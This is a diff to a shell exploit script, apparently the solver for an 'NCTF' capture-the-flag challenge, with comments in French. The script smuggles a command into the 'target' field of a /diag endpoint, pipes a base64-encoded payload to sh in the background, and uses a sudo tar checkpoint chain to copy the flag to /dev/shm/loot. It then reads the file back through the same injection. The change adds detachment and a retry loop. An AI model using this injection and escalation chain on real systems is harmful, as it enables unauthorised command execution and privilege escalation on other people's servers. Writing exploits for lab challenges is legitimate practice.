@@ -37,18 +37,25 @@ EOF
 
 WWW_B64="$(printf '%s' "$WWW" | base64 | tr -d '\n')"
 
-# Inject: "getent hosts x; <www payload via base64|sh>"
-INJECT="x; echo ${WWW_B64} | base64 -d | sh"
+# Inject: "getent hosts x; <www payload>". La chaîne (logsync -> sudo tar
+# checkpoint) est DÉTACHÉE (`... | sh &`) : /diag a un timeout de requête, et si
+# la chaîne tourne dans la requête elle se fait tuer avant d'écrire le loot. En
+# la détachant, /diag répond tout de suite et la chaîne se termine en fond.
+INJECT="x; echo ${WWW_B64} | base64 -d | sh &"
 
-echo "[*] firing chain through /diag ..." >&2
-curl -s -G "$BASE/diag" --data-urlencode "target=${INJECT}" >/dev/null || true
+echo "[*] firing chain through /diag (detached) ..." >&2
+curl -s -m 15 -G "$BASE/diag" --data-urlencode "target=${INJECT}" >/dev/null || true
 
-# Give tar's checkpoint action a moment, then read the loot back.
-sleep 1
+# La chaîne s'exécute en fond ; on relit le loot plusieurs fois le temps que
+# tar->checkpoint->cp aboutisse (démarrage à froid du conteneur inclus).
 echo "[*] reading /dev/shm/loot ..." >&2
-OUT="$(curl -s -G "$BASE/diag" --data-urlencode 'target=x; cat /dev/shm/loot 2>/dev/null')"
-
-FLAG="$(printf '%s' "$OUT" | grep -oE 'NCTF\{[^}]*\}' | head -n1 || true)"
+FLAG=""
+for i in 1 2 3 4 5 6; do
+    sleep 2
+    OUT="$(curl -s -m 15 -G "$BASE/diag" --data-urlencode 'target=x; cat /dev/shm/loot 2>/dev/null' || true)"
+    FLAG="$(printf '%s' "$OUT" | grep -oE 'NCTF\{[^}]*\}' | head -n1 || true)"
+    [ -n "$FLAG" ] && break
+done
 if [ -n "$FLAG" ]; then
     echo "[+] flag: $FLAG"
 else
